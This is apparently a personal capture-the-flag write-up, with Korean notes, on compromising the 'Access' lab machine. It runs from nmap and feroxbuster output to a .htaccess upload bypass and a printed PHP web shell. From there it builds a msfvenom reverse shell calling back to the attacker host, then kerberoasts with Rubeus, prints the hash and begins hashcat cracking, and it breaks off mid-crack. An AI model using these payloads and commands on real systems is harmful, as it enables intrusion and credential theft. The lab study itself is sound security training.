|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|     Failed to upload and execute a payload.
|
|_    Failed to upload and execute a payload.
| http-enum:
|   /forms/: Potentially interesting directory w/ listing on 'apache/2.4.48 (win64) openssl/1.1.1k php/8.0.7'
|   /icons/: Potentially interesting folder w/ directory listing
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.48 (win64) openssl/1.1.1k php/8.0.7'
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners:
|   cpe:/a:apache:http_server:2.4.48:
|       PACKETSTORM:176334      9.8     https://vulners.com/packetstorm/PACKETSTORM:176334      *EXPLOIT*
|       PACKETSTORM:171631      9.8     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       HTTPD:C072933AA965A86DA3E2C9172FFC1569  9.8     https://vulners.com/httpd/HTTPD:C072933AA965A86DA3E2C9172FFC1569
|       HTTPD:A1BBCE110E077FFBF4469D4F06DB9293  9.8     https://vulners.com/httpd/HTTPD:A1BBCE110E077FFBF4469D4F06DB9293
|       HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D  9.8     https://vulners.com/httpd/HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D
|       HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8  9.8     https://vulners.com/httpd/HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8
|       HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E  9.8     https://vulners.com/httpd/HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E
|       EDB-ID:51193    9.8     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
|       D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52    9.8     https://vulners.com/githubexploit/D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52        *EXPLOIT*
|       CVE-2026-44631  9.8     https://vulners.com/cve/CVE-2026-44631
|       CVE-2026-29167  9.8     https://vulners.com/cve/CVE-2026-29167
|       CVE-2026-28780  9.8     https://vulners.com/cve/CVE-2026-28780
|       CVE-2024-38476  9.8     https://vulners.com/cve/CVE-2024-38476
|       CVE-2024-38474  9.8     https://vulners.com/cve/CVE-2024-38474
|       CVE-2023-25690  9.8     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-31813  9.8     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  9.8     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  9.8     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  9.8     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  9.8     https://vulners.com/cve/CVE-2021-39275
|       CNVD-2024-36391 9.8     https://vulners.com/cnvd/CNVD-2024-36391
|       CNVD-2024-36388 9.8     https://vulners.com/cnvd/CNVD-2024-36388
|       CNVD-2022-51061 9.8     https://vulners.com/cnvd/CNVD-2022-51061
|       CNVD-2022-41640 9.8     https://vulners.com/cnvd/CNVD-2022-41640
|       CNVD-2022-03225 9.8     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        9.8     https://vulners.com/cnvd/CNVD-2021-102386
|       64A540A8-D918-5BEA-8F60-987F97B27A0C    9.8     https://vulners.com/githubexploit/64A540A8-D918-5BEA-8F60-987F97B27A0C        *EXPLOIT*
|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    9.8     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9        *EXPLOIT*
|       3F17CA20-788F-5C45-88B3-E12DB2979B7B    9.8     https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B        *EXPLOIT*
|       1337DAY-ID-39214        9.8     https://vulners.com/zdt/1337DAY-ID-39214        *EXPLOIT*
|       1337DAY-ID-38427        9.8     https://vulners.com/zdt/1337DAY-ID-38427        *EXPLOIT*
|       PACKETSTORM:213257      9.1     https://vulners.com/packetstorm/PACKETSTORM:213257      *EXPLOIT*
|       HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6  9.1     https://vulners.com/httpd/HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6
|       HTTPD:2C227652EE0B3B961706AAFCACA3D1E1  9.1     https://vulners.com/httpd/HTTPD:2C227652EE0B3B961706AAFCACA3D1E1
|       FD2EE3A5-BAEA-5845-BA35-E6889992214F    9.1     https://vulners.com/githubexploit/FD2EE3A5-BAEA-5845-BA35-E6889992214F        *EXPLOIT*
|       FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7    9.1     https://vulners.com/githubexploit/FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7        *EXPLOIT*
|       E606D7F4-5FA2-5907-B30E-367D6FFECD89    9.1     https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89        *EXPLOIT*
|       D8A19443-2A37-5592-8955-F614504AAF45    9.1     https://vulners.com/githubexploit/D8A19443-2A37-5592-8955-F614504AAF45        *EXPLOIT*
|       CVE-2026-42535  9.1     https://vulners.com/cve/CVE-2026-42535
|       CVE-2025-23048  9.1     https://vulners.com/cve/CVE-2025-23048
|       CVE-2024-40898  9.1     https://vulners.com/cve/CVE-2024-40898
|       CVE-2024-38475  9.1     https://vulners.com/cve/CVE-2024-38475
|       CVE-2022-28615  9.1     https://vulners.com/cve/CVE-2022-28615
|       CVE-2022-22721  9.1     https://vulners.com/cve/CVE-2022-22721
|       CNVD-2025-16610 9.1     https://vulners.com/cnvd/CNVD-2025-16610
|       CNVD-2024-36387 9.1     https://vulners.com/cnvd/CNVD-2024-36387
|       CNVD-2024-33814 9.1     https://vulners.com/cnvd/CNVD-2024-33814
|       CNVD-2022-51060 9.1     https://vulners.com/cnvd/CNVD-2022-51060
|       CNVD-2022-41638 9.1     https://vulners.com/cnvd/CNVD-2022-41638
|       B5E74010-A082-5ECE-AB37-623A5B33FE7D    9.1     https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D        *EXPLOIT*
|       5418A85B-F4B7-5BBD-B106-0800AC961C7A    9.1     https://vulners.com/githubexploit/5418A85B-F4B7-5BBD-B106-0800AC961C7A        *EXPLOIT*
|       HTTPD:1B3D546A8500818AAC5B1359FE11A7E4  9.0     https://vulners.com/httpd/HTTPD:1B3D546A8500818AAC5B1359FE11A7E4
|       CVE-2022-36760  9.0     https://vulners.com/cve/CVE-2022-36760
|       CVE-2021-40438  9.0     https://vulners.com/cve/CVE-2021-40438
|       CNVD-2023-30860 9.0     https://vulners.com/cnvd/CNVD-2023-30860
|       CNVD-2022-03224 9.0     https://vulners.com/cnvd/CNVD-2022-03224
|       AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C    9.0     https://vulners.com/githubexploit/AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C        *EXPLOIT*
|       9D9B3F4D-6B5C-5377-BE39-F1C432C9E457    9.0     https://vulners.com/githubexploit/9D9B3F4D-6B5C-5377-BE39-F1C432C9E457        *EXPLOIT*
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    9.0     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2        *EXPLOIT*
|       7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2    9.0     https://vulners.com/githubexploit/7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2        *EXPLOIT*
|       36618CA8-9316-59CA-B748-82F15F407C4F    9.0     https://vulners.com/githubexploit/36618CA8-9316-59CA-B748-82F15F407C4F        *EXPLOIT*
|       CVE-2026-24072  8.8     https://vulners.com/cve/CVE-2026-24072
|       40379BCA-07F4-5401-B618-4640793D350D    8.8     https://vulners.com/githubexploit/40379BCA-07F4-5401-B618-4640793D350D        *EXPLOIT*
|       CVE-2025-58098  8.3     https://vulners.com/cve/CVE-2025-58098
|       HTTPD:A7133572D328CD65C350E33F20834FAD  8.2     https://vulners.com/httpd/HTTPD:A7133572D328CD65C350E33F20834FAD
|       CVE-2021-44224  8.2     https://vulners.com/cve/CVE-2021-44224
|       CNVD-2021-102387        8.2     https://vulners.com/cnvd/CNVD-2021-102387
|       B0A9E5E8-7CCC-5984-9922-A89F11D6BF38    8.2     https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38        *EXPLOIT*
|       CVE-2024-38473  8.1     https://vulners.com/cve/CVE-2024-38473
|       23079A70-8B37-56D2-9D37-F638EBF7F8B5    8.1     https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5        *EXPLOIT*
|       HTTPD:F6C47B71D440F1A5B8EC9883D1516A33  7.5     https://vulners.com/httpd/HTTPD:F6C47B71D440F1A5B8EC9883D1516A33
|       HTTPD:F1CFBC9B54DFAD0499179863D36830BB  7.5     https://vulners.com/httpd/HTTPD:F1CFBC9B54DFAD0499179863D36830BB
|       HTTPD:C317C7138B4A8BBD54A901D6DDDCB837  7.5     https://vulners.com/httpd/HTTPD:C317C7138B4A8BBD54A901D6DDDCB837
|       HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F  7.5     https://vulners.com/httpd/HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F
|       HTTPD:B1B0A31C4AD388CC6C575931414173E2  7.5     https://vulners.com/httpd/HTTPD:B1B0A31C4AD388CC6C575931414173E2
|       HTTPD:8D3D8562E77EAD24FA6850949D025BC9  7.5     https://vulners.com/httpd/HTTPD:8D3D8562E77EAD24FA6850949D025BC9
|       HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5  7.5     https://vulners.com/httpd/HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5
|       EDEE9204-2DB4-5931-983F-6C7DB7FD4FB7    7.5     https://vulners.com/githubexploit/EDEE9204-2DB4-5931-983F-6C7DB7FD4FB7        *EXPLOIT*
|       CVE-2026-49975  7.5     https://vulners.com/cve/CVE-2026-49975
|       CVE-2026-42536  7.5     https://vulners.com/cve/CVE-2026-42536
|       CVE-2026-34356  7.5     https://vulners.com/cve/CVE-2026-34356
|       CVE-2026-34355  7.5     https://vulners.com/cve/CVE-2026-34355
|       CVE-2026-34059  7.5     https://vulners.com/cve/CVE-2026-34059
|       CVE-2026-29169  7.5     https://vulners.com/cve/CVE-2026-29169
|       CVE-2025-59775  7.5     https://vulners.com/cve/CVE-2025-59775
|       CVE-2025-55753  7.5     https://vulners.com/cve/CVE-2025-55753
|       CVE-2025-53020  7.5     https://vulners.com/cve/CVE-2025-53020
|       CVE-2025-49630  7.5     https://vulners.com/cve/CVE-2025-49630
|       CVE-2024-47252  7.5     https://vulners.com/cve/CVE-2024-47252
|       CVE-2024-43394  7.5     https://vulners.com/cve/CVE-2024-43394
|       CVE-2024-43204  7.5     https://vulners.com/cve/CVE-2024-43204
|       CVE-2024-42516  7.5     https://vulners.com/cve/CVE-2024-42516
|       CVE-2024-39573  7.5     https://vulners.com/cve/CVE-2024-39573
|       CVE-2024-38477  7.5     https://vulners.com/cve/CVE-2024-38477
|       CVE-2024-38472  7.5     https://vulners.com/cve/CVE-2024-38472
|       CVE-2024-27316  7.5     https://vulners.com/cve/CVE-2024-27316
|       CVE-2023-31122  7.5     https://vulners.com/cve/CVE-2023-31122
|       CVE-2023-27522  7.5     https://vulners.com/cve/CVE-2023-27522
|       CVE-2022-30556  7.5     https://vulners.com/cve/CVE-2022-30556
|       CVE-2022-29404  7.5     https://vulners.com/cve/CVE-2022-29404
|       CVE-2022-26377  7.5     https://vulners.com/cve/CVE-2022-26377
|       CVE-2022-22719  7.5     https://vulners.com/cve/CVE-2022-22719
|       CVE-2021-36160  7.5     https://vulners.com/cve/CVE-2021-36160
|       CVE-2021-34798  7.5     https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-33193  7.5     https://vulners.com/cve/CVE-2021-33193
|       CVE-2006-20001  7.5     https://vulners.com/cve/CVE-2006-20001
|       CNVD-2025-30837 7.5     https://vulners.com/cnvd/CNVD-2025-30837
|       CNVD-2025-30836 7.5     https://vulners.com/cnvd/CNVD-2025-30836
|       CNVD-2025-16614 7.5     https://vulners.com/cnvd/CNVD-2025-16614
|       CNVD-2025-16613 7.5     https://vulners.com/cnvd/CNVD-2025-16613
|       CNVD-2025-16612 7.5     https://vulners.com/cnvd/CNVD-2025-16612
|       CNVD-2025-16609 7.5     https://vulners.com/cnvd/CNVD-2025-16609
|       CNVD-2025-16608 7.5     https://vulners.com/cnvd/CNVD-2025-16608
|       CNVD-2025-16603 7.5     https://vulners.com/cnvd/CNVD-2025-16603
|       CNVD-2024-36393 7.5     https://vulners.com/cnvd/CNVD-2024-36393
|       CNVD-2024-36390 7.5     https://vulners.com/cnvd/CNVD-2024-36390
|       CNVD-2024-36389 7.5     https://vulners.com/cnvd/CNVD-2024-36389
|       CNVD-2024-20839 7.5     https://vulners.com/cnvd/CNVD-2024-20839
|       CNVD-2023-93320 7.5     https://vulners.com/cnvd/CNVD-2023-93320
|       CNVD-2023-80558 7.5     https://vulners.com/cnvd/CNVD-2023-80558
|       CNVD-2022-53584 7.5     https://vulners.com/cnvd/CNVD-2022-53584
|       CNVD-2022-51058 7.5     https://vulners.com/cnvd/CNVD-2022-51058
|       CNVD-2022-41639 7.5     https://vulners.com/cnvd/CNVD-2022-41639
|       CNVD-2022-03223 7.5     https://vulners.com/cnvd/CNVD-2022-03223
|       CNVD-2022-03205 7.5     https://vulners.com/cnvd/CNVD-2022-03205
|       CDC791CD-A414-5ABE-A897-7CFA3C2D3D29    7.5     https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29        *EXPLOIT*
|       C2EB4AA1-0C70-5104-AF4C-BC274F5A5B7A    7.5     https://vulners.com/githubexploit/C2EB4AA1-0C70-5104-AF4C-BC274F5A5B7A        *EXPLOIT*
|       A5675239-3520-5F86-A975-8C0FBB77C2A9    7.5     https://vulners.com/githubexploit/A5675239-3520-5F86-A975-8C0FBB77C2A9        *EXPLOIT*
|       A0F268C8-7319-5637-82F7-8DAF72D14629    7.5     https://vulners.com/githubexploit/A0F268C8-7319-5637-82F7-8DAF72D14629        *EXPLOIT*
|       742112F7-4755-5E94-8DD2-899160B59E5E    7.5     https://vulners.com/githubexploit/742112F7-4755-5E94-8DD2-899160B59E5E        *EXPLOIT*
|       5B7082BE-022C-5DCA-BCDA-0F8EDD0E5085    7.5     https://vulners.com/githubexploit/5B7082BE-022C-5DCA-BCDA-0F8EDD0E5085        *EXPLOIT*
|       45D138AD-BEC6-552A-91EA-8816914CA7F4    7.5     https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4        *EXPLOIT*
|       0E08753E-C6D7-5E76-A61F-6CA6F7F87AA8    7.5     https://vulners.com/githubexploit/0E08753E-C6D7-5E76-A61F-6CA6F7F87AA8        *EXPLOIT*
|       CVE-2025-49812  7.4     https://vulners.com/cve/CVE-2025-49812
|       CVE-2026-44186  7.3     https://vulners.com/cve/CVE-2026-44186
|       CVE-2026-44185  7.3     https://vulners.com/cve/CVE-2026-44185
|       CVE-2026-29168  7.3     https://vulners.com/cve/CVE-2026-29168
|       CVE-2023-38709  7.3     https://vulners.com/cve/CVE-2023-38709
|       CNVD-2024-36395 7.3     https://vulners.com/cnvd/CNVD-2024-36395
|       CVE-2026-43951  6.5     https://vulners.com/cve/CVE-2026-43951
|       CVE-2026-33523  6.5     https://vulners.com/cve/CVE-2026-33523
|       CVE-2025-65082  6.5     https://vulners.com/cve/CVE-2025-65082
|       CNVD-2025-30833 6.5     https://vulners.com/cnvd/CNVD-2025-30833
|       CVE-2024-24795  6.3     https://vulners.com/cve/CVE-2024-24795
|       CNVD-2024-36394 6.3     https://vulners.com/cnvd/CNVD-2024-36394
|       CVE-2026-29170  6.1     https://vulners.com/cve/CVE-2026-29170
|       CVE-2023-45802  5.9     https://vulners.com/cve/CVE-2023-45802
|       556687CB-7B66-53C5-A79C-84B0ED753C7E    5.9     https://vulners.com/githubexploit/556687CB-7B66-53C5-A79C-84B0ED753C7E        *EXPLOIT*
|       CVE-2026-44119  5.5     https://vulners.com/cve/CVE-2026-44119
|       CVE-2025-66200  5.4     https://vulners.com/cve/CVE-2025-66200
|       CNVD-2025-30835 5.4     https://vulners.com/cnvd/CNVD-2025-30835
|       HTTPD:BAAB4065D254D64A717E8A5C847C7BCA  5.3     https://vulners.com/httpd/HTTPD:BAAB4065D254D64A717E8A5C847C7BCA
|       HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F  5.3     https://vulners.com/httpd/HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F
|       CVE-2026-34032  5.3     https://vulners.com/cve/CVE-2026-34032
|       CVE-2026-33857  5.3     https://vulners.com/cve/CVE-2026-33857
|       CVE-2026-33007  5.3     https://vulners.com/cve/CVE-2026-33007
|       CVE-2022-37436  5.3     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-28614  5.3     https://vulners.com/cve/CVE-2022-28614
|       CVE-2022-28330  5.3     https://vulners.com/cve/CVE-2022-28330
|       CNVD-2023-30859 5.3     https://vulners.com/cnvd/CNVD-2023-30859
|       CNVD-2022-53582 5.3     https://vulners.com/cnvd/CNVD-2022-53582
|       CNVD-2022-51059 5.3     https://vulners.com/cnvd/CNVD-2022-51059
|       EA6ADD14-D80B-5DC2-9991-1F9663E2D09F    4.8     https://vulners.com/githubexploit/EA6ADD14-D80B-5DC2-9991-1F9663E2D09F        *EXPLOIT*
|       CVE-2026-33006  4.8     https://vulners.com/cve/CVE-2026-33006
|_      74A7BA4E-D496-587B-A72A-FA0BE663F994    0.0     https://vulners.com/githubexploit/74A7BA4E-D496-587B-A72A-FA0BE663F994        *EXPLOIT*
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.193.187
|   Found the following possible CSRF vulnerabilities:
|
|     Path: https://192.168.193.187:443/
|     Form id:
|     Form action: #
|
|     Path: https://192.168.193.187:443/
|     Form id: ticket-type
|     Form action: /Ticket.php
|
|     Path: https://192.168.193.187:443/
|     Form id: name
|     Form action: forms/contact.php
|
|     Path: https://192.168.193.187:443/index.html
|     Form id:
|     Form action: #
|
|     Path: https://192.168.193.187:443/index.html
|     Form id: ticket-type
|     Form action: /Ticket.php
|
|     Path: https://192.168.193.187:443/index.html
|     Form id: name
|_    Form action: forms/contact.php
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
| ssl-dh-params:
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: RFC2409/Oakley Group 2
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
445/tcp  open  microsoft-ds? syn-ack ttl 125
464/tcp  open  kpasswd5?     syn-ack ttl 125
593/tcp  open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 125
|_ssl-ccs-injection: No reply from server (TIMEOUT)
3268/tcp open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 125
|_ssl-ccs-injection: No reply from server (TIMEOUT)
5985/tcp open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 09:48
Completed NSE at 09:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 09:48
Completed NSE at 09:48, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 471.68 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.100KB)
```


feroxbuster 실행 시 uploads 폴더 확인
```bash
┌──(kali㉿kali)-[~/PG/Access]
└─$ feroxbuster -u http://192.168.193.187:80/ -s 200 -t 200 -x php,html,txt,bak,zip -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.193.187/
 🚩  In-Scope Url          │ 192.168.193.187
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, bak, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
```
![[Pasted image 20260701110857.png]]



php파일 업로드 불가하여 .htaccess 파일 업로드
```bash
#.htaccess 파일 내용
AddType application/x-httpd-php .shell
AddHandler application/x-httpd-php .shell
```
![[Pasted image 20260701110514.png]]

업로드 완료
![[Pasted image 20260701110532.png]]

.shell 파일 실행할 수 있도록 php 파일 이름 변경 
```bash
┌──(kali㉿kali)-[~/PG/Access]
└─$ mv simple-backdoor.php evil.shell

┌──(kali㉿kali)-[~/PG/Access]
└─$ cat evil.shell
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
```


reverse.exe 생성 
```bash
┌──(kali㉿kali)-[~/PG/Access]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.182 LPORT=4444 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
```

업로드 진행

![[Pasted image 20260701140039.png]]

자격증명 획득
```bash
┌──(kali㉿kali)-[~/PG/Access]
└─$ curl http://192.168.193.187/uploads/evil.shell?cmd=.\\back.exe

┌──(kali㉿kali)-[~/PG/Access]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.182] from (UNKNOWN) [192.168.193.187] 51105
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\uploads>whoami
whoami
access\svc_apache
```

powershell bypass 설정
```bash
c:\Users\svc_apache\Desktop>powershell -ep bypass
powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\svc_apache\Desktop>
```

계정 권한 확인
```bash
PS C:\Users\svc_apache\Desktop> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```


Rubeus.exe 실행 시 svc_mssql 계정 획득
```bash
PS C:\users\svc_apache\Desktop> .\\Rubeus.exe kerberoast /outfile:kerberoast.hashes
.\\Rubeus.exe kerberoast /outfile:kerberoast.hashes

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
[*] PwdLastSet             : 5/21/2022 12:33:45 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\users\svc_apache\Desktop\kerberoast.hashes

[*] Roasted hashes written to : C:\users\svc_apache\Desktop\kerberoast.hashes
```

hash
```bash
PS C:\users\svc_apache\Desktop> type kerberoast.hashes
type kerberoast.hashes
$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$AD528AE4D9A9705520EEA35C2CA46749$C93F282CA2434F2A6714E7CE33DFAD88EE12131382214681D7CD6E586C6E9E5021FAD225D083A71116612CB49347E2627EA6577B166C54886A07B98D2AADF13F8BDA87430A494DD68EE8248CFDA0D6780F84F8BC748CF2BF09E2D27A967463C1833237F91B7965D7CB13E93AAE94DBB164223AE3CCB873E2CEA9BF4411C402D8E3353C38B276D20390785B16609E8DE51C7931B9D15607849A79181F50BAE873A29620070BED98D0AB3C028CECBB3AC73E025D48BCD0D42C232F2CCF5A64804D2D4B182B2A0A7412C0E9DE3C5833CC0C6D2068398E62849A56866697F879AF31881DDA07DBC45EB9DE4F6BA5E4F1FE225A228E1457EB235A5C2943CF32DE8B340A04F4B81CD2DC99A19CDE6A5F0F4B9F3929CBA51E0DD29B750A927B84D93ACB131A9B80D8E76F16DDC19F9367B9EAF6B2DB2F41A370949F67EE16BA4AF0426B5469E0EA7A22F7B837DB9541D336495DA48049985D0E61B7FD5599B91427BD5A70474886B8203E7429780147CC322D6663277E7D09EB740D1CD89EA4CB9905B95386D597832294EB1F118E179989EE3C10B80CBDA689849B0331E8D2973BD609DCE0E196B4D2E851A99862C57ADEF99446F2384C8251F4DD070F2DB1F7F70E6754D24DF74272F66DF7A7939175D697F765CB9FEB36D4B0C2A7382380A7ABF03AEFF4B4077674643591D73BE73C1CED2E764731BC39B91E50F5AAE9058D327EA91559E1127A334C8235FAFFA94CF1CA7A9F5097A3310DA00E8DD641288BA19821F39B04927E69AF6D34A583D020159E78F08053B44187EB502B0AF980308BF2867BC8B99E10382FD9CB3DAFEBC3F18B5CEE9B467381EB022366AC5EF4A61672F7EEF99F09EFC9ECC0584EE71B92C24349B72C38C9AEC834C6D8088E66C9472287E07DACC6869E32FA31F7E6EDB340065037980217011AE51EEB2BEF3C3781C45B9C7CAC37DAB81595F351E80D43B78312FA8DCB98DF617B53EBADB4B56FB9E12CDE17BF83179847F28BEA23022B788E6030832C0552C842979EFDBFABC5F1116509BF267C5619F9FA41A6A494329926F4B5012D841F87FC1AA88E887A3179331F9C7F461DFF293F08911A947AEA11F653BA894A9D4C42E07A3454F4830EF5375C9ADF14F58D12CAF6A226BA3D15D4890BDC494FE223EB66B2544A920A20B602469609D8C3B558DBA3A540C4096567F2FAA41ABCD81F971510EE97411C9C4F3D267D123FA1447C393BC3FAD48607C1222704E20404DDFF8E21CDA1F7074D3D747A5846EFC7E6283E36C48B18F9836E713E6C9FA428A80560F86DB6345E8E138D89D1C8F19E6CD78EC94C1B3D61C76EC539839732B257831E0A5DB661BBA067AB7A8F4C637F14FAD3A5C052E67919F87F692F23C3DE19ECB6444FF02C06E8CB45AF255835021CF8979F1D91D9F6772D62E1FBFA6346313A46DD7F1D4287B41B7F86953CD0DEDAABD3DF3D747929D5E19FF66AB7D5B5F8B321A878122586400D5A58C72683D5FC54652DB0833FB15953430E8040B428125DFEA52EC566AE38AB8653EF3648371AC266D5E55BFF209EB994FE96FBE843305B7DCBD145DE782A6932BB316A66C9E46ABDEFF1CD015051B08AEFF191
```

hash 파일 크랙 `svc_mysql/trustno1`
```bash
┌──(kali㉿kali)-[~/PG/Access]
└─$ hashcat -a 0 -m 13100 svc_mysql.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 9800X3D 8-Core Processor, 11147/22294 MB (4096 MB allocatable), 4MCU

